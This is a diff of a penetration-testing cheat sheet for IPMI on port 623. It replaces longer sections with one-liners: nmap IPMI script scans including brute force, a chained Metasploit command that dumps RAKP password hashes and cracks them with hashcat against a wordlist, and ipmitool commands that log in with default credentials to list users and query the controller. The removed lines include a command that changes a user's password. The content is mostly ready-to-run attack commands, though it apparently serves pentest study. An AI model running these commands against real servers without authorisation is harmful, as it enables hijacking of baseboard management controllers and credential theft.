@@ -13,64 +13,32 @@
 
 ## Enumeration
 
-### Nmap Scripts
+### Quick Check (One-liner)
 
 ```shell
-# Service detection (UDP)
-nmap -p 623 -sU -sV $rhost
-
-# IPMI information
-nmap -p 623 -sU --script ipmi-version $rhost
-nmap -p 623 -sU --script ipmi-brute $rhost
-```
-
-### Metasploit
-
-```shell
-# IPMI version detection
-use auxiliary/scanner/ipmi/ipmi_version
-set RHOSTS $rhost
-run
-
-# IPMI dump hashes (RAKP vulnerability)
-use auxiliary/scanner/ipmi/ipmi_dumphashes
-set RHOSTS $rhost
-set OUTPUT_HASHCAT_FILE hashes.txt
-run
+# Nmap IPMI scripts
+nmap -p 623 -sU --script "ipmi-*" $rhost
 ```
 
 ---
 
-## Exploitation
+## Exploitation (One-liner)
 
-### IPMI Authentication Bypass
-
-> IPMI 2.0 RAKP Authentication Remote Password Hash Retrieval
-
-IPMI 2.0 allows retrieval of password hashes without authentication.
+### IPMI Hash Dumping (RAKP Vulnerability)
 
 ```shell
-# Metasploit - dump hashes
-use auxiliary/scanner/ipmi/ipmi_dumphashes
-set RHOSTS $rhost
-set OUTPUT_HASHCAT_FILE ipmi_hashes.txt
-run
-
-# Crack with hashcat (mode 7300 for IPMI2 RAKP HMAC-SHA1)
-hashcat -m 7300 ipmi_hashes.txt /usr/share/wordlists/rockyou.txt
+# Metasploit dump + crack
+msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS $rhost; set OUTPUT_HASHCAT_FILE ipmi.txt; run; exit" && hashcat -m 7300 ipmi.txt /usr/share/wordlists/rockyou.txt
 ```
 
-### IPMI Hash Dumping
+### ipmitool Commands
 
 ```shell
-# Using ipmitool
+# List users
 ipmitool -I lanplus -H $rhost -U admin -P password user list
 
-# Get user list
-ipmitool -I lanplus -H $rhost -U admin -P password user list 1
-
-# Change password
-ipmitool -I lanplus -H $rhost -U admin -P password user set password 2 newpassword
+# Get system info
+ipmitool -I lanplus -H $rhost -U admin -P password mc info
 ```
 
 ---
